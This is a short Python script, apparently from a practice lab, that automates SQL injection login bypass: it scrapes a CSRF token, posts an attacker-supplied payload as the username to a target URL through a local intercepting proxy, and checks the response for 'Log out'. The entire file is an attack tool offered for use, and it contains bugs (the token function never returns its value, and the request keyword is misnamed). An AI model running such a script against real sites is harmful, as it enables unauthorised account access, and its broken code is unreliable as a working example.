import requests
import sys
import urllib3
import pyfiglet
from bs4 import BeautifulSoup

ascii_banner = pyfiglet.figlet_format("RuhanSec\nSQLI\nSCRIPT")
print(ascii_banner)

proxy = {'http': 'http://127.0.0.1:8080'}


def get_csrf_token(s,url):
        r = s.get(url, verify= False, proxy=proxy)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf= soup.find("input")['value']
        print(csrf)

def exploit_sqli(s,url,payload):
        csrf= get_csrf_token(s,url)
        data = {"csrf":csrf,
         "Username":payload,
         "password":'randomtxt'}
        r = s.post(url, data=data,proxy=proxy,verify=False)
        res = r.text
        if "Log out" in res:
                return True
        else:
                return False
         




if __name__ == "__main__":

        try:
                url = sys.argv[1].strip()
                payload = sys.argv[2].strip()
        except IndexError:
                print('[-] Example: %s <"www.example.com(target)"> <"1=1(payload)">'%sys.argv[0])

        s = requests.Session()

        if exploit_sqli(s,url,payload):
                print('[+] sqli successful!')
        
        else:
                print('[-] sqli unsuccessful!')




